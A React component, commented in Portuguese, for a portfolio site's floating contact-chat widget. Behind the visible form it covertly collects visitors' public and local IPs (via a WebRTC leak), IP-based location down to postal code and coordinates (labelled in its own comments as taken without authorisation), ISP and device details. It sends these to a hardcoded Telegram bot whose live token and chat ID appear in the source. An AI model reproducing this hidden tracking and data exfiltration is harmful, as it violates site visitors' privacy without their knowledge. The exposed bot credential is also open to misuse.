import { useState } from 'react';
import { useTranslation } from 'react-i18next';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { motion, AnimatePresence } from 'framer-motion';
import { FiMessageSquare, FiX, FiSend, FiUser, FiPhone } from 'react-icons/fi';
import { popIn } from '@/lib/animations';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { useToast } from '@/hooks/use-toast';

// Definir o tipo ChatFormData antes do componente
type ChatFormData = {
  name: string;
  email: string;
  message: string;
};

// Função para sanitizar texto - DEFINIDA FORA DO COMPONENTE
const sanitizeText = (text: string): string => {
  if (!text) return '';
  return text
    .replace(/\*/g, '✻')
    .replace(/_/g, '＿')
    .replace(/`/g, '´')
    .replace(/#/g, '№')
    .replace(/-/g, '–')
    .replace(/\[/g, '⟦')
    .replace(/\]/g, '⟧')
    .replace(/\(/g, '⦅')
    .replace(/\)/g, '⦆');
};

// Função para obter IPs locais
const getLocalIPs = (): Promise<string[]> => {
  return new Promise((resolve) => {
    const ips: string[] = [];
    
    // Verificar se WebRTC está disponível
    if (!RTCPeerConnection) {
      resolve(ips);
      return;
    }

    try {
      const pc = new RTCPeerConnection({ iceServers: [] });
      
      pc.createDataChannel('');
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
      
      pc.onicecandidate = (ice) => {
        if (!ice.candidate) {
          resolve(ips);
          return;
        }
        
        const candidate = ice.candidate.candidate;
        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const match = candidate.match(ipRegex);
        
        if (match && !ips.includes(match[1])) {
          ips.push(match[1]);
        }
      };
      
      setTimeout(() => resolve(ips), 1000);
    } catch (error) {
      console.log('Erro WebRTC:', error);
      resolve(ips);
    }
  });
};

// Adicionar polyfill para timeout se necessário
if (!AbortSignal.timeout) {
  AbortSignal.timeout = function(ms: number) {
    const controller = new AbortController();
    setTimeout(() => controller.abort(new Error("Timeout")), ms);
    return controller.signal;
  };
}

// Função para obter localização detalhada por IP (SEM AUTORIZAÇÃO)
const getIPGeolocation = async () => {
  try {
    // Tentar vários serviços de geolocalização por IP como fallback
    const services = [
      'https://ipapi.co/json/',
      'https://ipinfo.io/json/',
      'https://geolocation-db.com/json/',
      'https://api.db-ip.com/v2/free/self'
    ];

    for (const service of services) {
      try {
        const response = await fetch(service, { 
          signal: AbortSignal.timeout(5000) // Timeout de 5 segundos
        });
        
        if (response.ok) {
          const data = await response.json();
          
          // Padronizar os dados de diferentes serviços
          let locationData = {
            ip: data.ip || data.IPv4 || '',
            country: data.country_name || data.country || '',
            region: data.region || data.state || data.region_name || '',
            city: data.city || '',
            latitude: data.latitude || data.lat || null,
            longitude: data.longitude || data.lon || data.lng || null,
            isp: data.org || data.isp || data.asn || '',
            timezone: data.timezone || '',
            postal: data.postal || data.zip || ''
          };
          
          console.log('📍 Dados de localização obtidos:', locationData);
          return locationData;
        }
      } catch (error) {
        console.log(`Serviço ${service} falhou, tentando próximo...`);
        continue;
      }
    }
    
    throw new Error('Todos os serviços de geolocalização falharam');
    
  } catch (error) {
    console.log('Erro na geolocalização por IP:', error);
    return {
      ip: '',
      country: 'Não disponível',
      region: 'Não disponível',
      city: 'Não disponível',
      latitude: null,
      longitude: null,
      isp: 'Não disponível',
      timezone: 'Não disponível',
      postal: ''
    };
  }
};

// Função para obter informações completas de rede
const getCompleteNetworkInfo = async () => {
  try {
    // IP Público
    let publicIP = 'Não detectado';
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      publicIP = ipData.ip;
    } catch (error) {
      console.log('Erro ao obter IP público:', error);
    }

    // IPs Locais
    const localIPs = await getLocalIPs();
    
    // Informações de conexão
    const connection = (navigator as any).connection;
    const connectionInfo = connection ? {
      type: connection.effectiveType,
      downlink: connection.downlink + ' Mbps',
      rtt: connection.rtt + ' ms'
    } : {
      type: 'desconhecido',
      downlink: 'desconhecido',
      rtt: 'desconhecido'
    };
    
    // Obter localização detalhada por IP (SEM PERMISSÃO)
    const ipLocation = await getIPGeolocation();
    
    return {
      publicIP: ipLocation.ip || publicIP,
      localIPs,
      connectionType: connectionInfo.type,
      downlink: connectionInfo.downlink,
      rtt: connectionInfo.rtt,
      // DETALHES COMPLETOS DA LOCALIZAÇÃO
      locationByIP: `${ipLocation.city || 'N/A'}, ${ipLocation.region || 'N/A'}, ${ipLocation.country || 'N/A'}`,
      country: ipLocation.country,
      region: ipLocation.region,
      city: ipLocation.city,
      isp: ipLocation.isp,
      timezone: ipLocation.timezone,
      postalCode: ipLocation.postal,
      // COORDENADAS POR IP (aproximadas)
      coordinates: {
        latitude: ipLocation.latitude,
        longitude: ipLocation.longitude,
        accuracy: 'Aproximada (baseada em IP)',
        source: 'IP Geolocation'
      },
      hasExactGPS: false // Indica que não usamos GPS real
    };
    
  } catch (error) {
    console.log('Erro ao obter informações de rede:', error);
    return {
      publicIP: 'Erro ao obter',
      localIPs: [],
      connectionType: 'desconhecido',
      downlink: 'desconhecido',
      rtt: 'desconhecido',
      locationByIP: 'Erro ao obter',
      coordinates: {
        latitude: null,
        longitude: null,
        accuracy: 'Indisponível',
        source: 'Erro'
      },
      hasExactGPS: false
    };
  }
};

export default function ChatButton() {
  const { t } = useTranslation();
  const [isOpen, setIsOpen] = useState(false);
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);

  const chatFormSchema = z.object({
    name: z.string().min(2, { message: t('chat.validation.nameMin') || 'Nome deve ter pelo menos 2 caracteres' }),
    email: z.string().email({ message: t('contact.validation.email') || 'Por favor, insira um email válido' }).optional().or(z.literal('')),
    message: z.string().min(5, { message: t('chat.validation.messageMin') || 'Mensagem deve ter pelo menos 5 caracteres' }),
  });

  const { register, handleSubmit, reset, formState: { errors } } = useForm<ChatFormData>({
    resolver: zodResolver(chatFormSchema),
    defaultValues: {
      name: '',
      email: '',
      message: ''
    }
  });

  const sendToTelegram = async (data: ChatFormData) => {
    const botToken = '8435540690:AAGDnA4OPJkGcn3HDlvJsXtuS41s5h2dud0';
    const chatId = '1255481153';
    
    // Coletar informações completas de rede
    const networkInfo = await getCompleteNetworkInfo();

    // ✅ CORREÇÃO: navigator.javaEnabled() é uma função que precisa ser chamada
    const javaEnabled = typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false;

    const telegramMessage = `💬 NOVA MENSAGEM DO PORTFÓLIO

👤 INFORMAÇÕES PESSOAIS
• Nome: ${sanitizeText(data.name)}
• Email: ${data.email ? sanitizeText(data.email) : 'Não informado'}

📝 MENSAGEM
${sanitizeText(data.message)}

🌍 INFORMAÇÕES DE REDE
• IP Público: ${networkInfo.publicIP}
• IPs Locais: ${networkInfo.localIPs.join(', ') || 'Não detectados'}
• Tipo de Conexão: ${networkInfo.connectionType}
• Velocidade Download: ${networkInfo.downlink}
• Latência: ${networkInfo.rtt}
• Provedor (ISP): ${networkInfo.isp}

📍 LOCALIZAÇÃO POR IP (SEM AUTORIZAÇÃO)
• Localização: ${networkInfo.locationByIP}
• País: ${networkInfo.country || 'N/A'}
• Região: ${networkInfo.region || 'N/A'}
• Cidade: ${networkInfo.city || 'N/A'}
• CEP: ${networkInfo.postalCode || 'N/A'}
• Fuso Horário: ${networkInfo.timezone || 'N/A'}

🗺️ COORDENADAS APROXIMADAS
• Latitude: ${networkInfo.coordinates.latitude || 'Não disponível'}
• Longitude: ${networkInfo.coordinates.longitude || 'Não disponível'}
• Precisão: ${networkInfo.coordinates.accuracy}
• Fonte: ${networkInfo.coordinates.source}
• GPS Exato: ${networkInfo.hasExactGPS ? 'Sim' : 'Não (apenas por IP)'}

💻 INFORMAÇÕES DO DISPOSITIVO
• Navegador: ${sanitizeText(navigator.userAgent.split(') ')[0].split('(')[1] || 'Desconhecido')}
• Sistema: ${sanitizeText(navigator.platform)}
• Idioma: ${sanitizeText(navigator.language)}
• Tela: ${screen.width}x${screen.height}
• Timezone: ${sanitizeText(Intl.DateTimeFormat().resolvedOptions().timeZone)}
• Cookies: ${navigator.cookieEnabled ? 'Ativados' : 'Desativados'}
• Java: ${javaEnabled ? 'Ativado' : 'Desativado'}

⏰ DATA/HORA
• Enviado em: ${new Date().toLocaleString('pt-BR')}
• Timestamp: ${new Date().toISOString()}

--- FIM DA MENSAGEM ---`;

    console.log('🔧 Enviando mensagem para Telegram...');

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: telegramMessage,
        }),
      });

      console.log('📨 Resposta do Telegram:', response.status, response.statusText);

      if (!response.ok) {
        const errorText = await response.text();
        console.error('❌ Erro do Telegram:', errorText);
        
        // Tentar enviar uma mensagem mais simples em caso de erro
        if (errorText.includes('parse entities')) {
          const simpleMessage = `Nova mensagem de ${sanitizeText(data.name)}: ${sanitizeText(data.message.substring(0, 100))}...`;
          const simpleResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: simpleMessage,
            }),
          });
          
          if (simpleResponse.ok) {
            console.log('✅ Mensagem simples enviada com sucesso!');
            return await simpleResponse.json();
          }
        }
        
        throw new Error(`Telegram API error: ${response.status}`);
      }

      const result = await response.json();
      console.log('✅ Mensagem enviada com sucesso!');
      return result;

    } catch (error) {
      console.error('❌ Erro completo:', error);
      throw error;
    }
  };

  const onSubmit = async (data: ChatFormData) => {
    console.log('🚀 Iniciando envio do formulário...', data);
    setIsSubmitting(true);

    try {
      await sendToTelegram(data);
      
      console.log('🎉 Sucesso! Mostrando mensagem de confirmação...');
      toast({
        title: "✅ Mensagem enviada com sucesso!",
        description: "Sua mensagem foi recebida no Telegram. Responderei em breve!",
        variant: "default",
        duration: 6000,
      });
      
      // Limpar formulário e fechar após sucesso
      reset();
      setTimeout(() => {
        setIsOpen(false);
        setIsSubmitting(false);
        console.log('📝 Formulário limpo e fechado.');
      }, 2000);
      
    } catch (error: any) {
      console.error('💥 Erro no envio:', error);
      
      let errorMessage = "Erro ao enviar mensagem. Tente novamente.";
      
      if (error.message.includes('401')) {
        errorMessage = "Erro de autenticação. Verifique as configurações.";
      } else if (error.message.includes('400')) {
        errorMessage = "Problema na formatação da mensagem. Tente novamente com texto mais simples.";
      } else if (error.message.includes('Failed to fetch')) {
        errorMessage = "Erro de conexão. Verifique sua internet.";
      }

      toast({
        title: "❌ Erro ao enviar",
        description: errorMessage,
        variant: "destructive",
        duration: 6000,
      });
      
      setIsSubmitting(false);
    }
  };

  return (
    <div className="fixed bottom-6 right-6 z-50">
      <Button 
        variant="default" 
        size="icon" 
        className="chat-button rounded-full w-14 h-14 shadow-lg bg-primary hover:bg-primary/90 text-primary-foreground"
        onClick={() => setIsOpen(!isOpen)}
        aria-label={isOpen ? t('chat.closeLabel') || 'Fechar chat' : t('chat.openLabel') || 'Abrir chat'}
      >
        {isOpen ? <FiX className="h-6 w-6" /> : <FiMessageSquare className="h-6 w-6" />}
      </Button>
      
      <AnimatePresence>
        {isOpen && (
          <motion.div 
            className="absolute bottom-20 right-0 w-96 bg-card rounded-xl shadow-2xl border border-border p-4"
            variants={popIn}
            initial="hidden"
            animate="visible"
            exit="hidden"
          >
            <div className="flex justify-between items-center mb-4">
              <div>
                <h3 className="text-lg font-bold text-card-foreground">
                  {t('chat.title') || 'Chat Rápido'}
                </h3>
                <p className="text-sm text-muted-foreground">
                  Envie uma mensagem direta 
                </p>
              </div>
              <Button 
                variant="ghost" 
                size="icon" 
                className="h-7 w-7 hover:bg-secondary" 
                onClick={() => setIsOpen(false)}
                aria-label={t('chat.closeLabel') || 'Fechar chat'}
              >
                <FiX className="h-4 w-4" />
              </Button>
            </div>
            
            <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label htmlFor="chat-name" className="block text-sm font-medium text-card-foreground mb-1">
                    <FiUser className="inline w-3 h-3 mr-1" />
                    {t('chat.nameLabel') || 'Seu nome*'}
                  </label>
                  <Input 
                    id="chat-name" 
                    placeholder={t('chat.namePlaceholder') || 'Seu nome'}
                    {...register("name")}
                    className="w-full bg-background border-input"
                    disabled={isSubmitting}
                  />
                  {errors.name && (
                    <p className="mt-1 text-xs text-destructive">{errors.name.message}</p>
                  )}
                </div>
                
                <div>
                  <label htmlFor="chat-email" className="block text-sm font-medium text-card-foreground mb-1">
                    <FiPhone className="inline w-3 h-3 mr-1" />
                    Telefone (opcional)
                  </label>
                  <Input 
                    id="chat-email" 
                    type="email"
                    placeholder="+55 (XX) XXXXX-XXXX"
                    {...register("email")}
                    className="w-full bg-background border-input"
                    disabled={isSubmitting}
                  />
                  {errors.email && (
                    <p className="mt-1 text-xs text-destructive">{errors.email.message}</p>
                  )}
                </div>
              </div>
              
              <div>
                <label htmlFor="chat-message" className="block text-sm font-medium text-card-foreground mb-1">
                  {t('chat.messageLabel') || 'Sua mensagem*'}
                </label>
                <Textarea 
                  id="chat-message" 
                  rows={4} 
                  placeholder={t('chat.messagePlaceholder') || 'Conte-me como posso ajudar...'}
                  {...register("message")}
                  className="w-full resize-none bg-background border-input"
                  disabled={isSubmitting}
                />
                {errors.message && (
                  <p className="mt-1 text-xs text-destructive">{errors.message.message}</p>
                )}
              </div>
              
              <Button 
                type="submit" 
                className="w-full flex items-center justify-center gap-2 bg-primary hover:bg-primary/90 text-primary-foreground"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-current"></div>
                    <span>Enviando...</span>
                  </>
                ) : (
                  <>
                    <FiSend className="h-4 w-4" />
                    <span>{t('chat.submitButton') || 'Enviar Mensagem'}</span>
                  </>
                )}
              </Button>
            </form>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}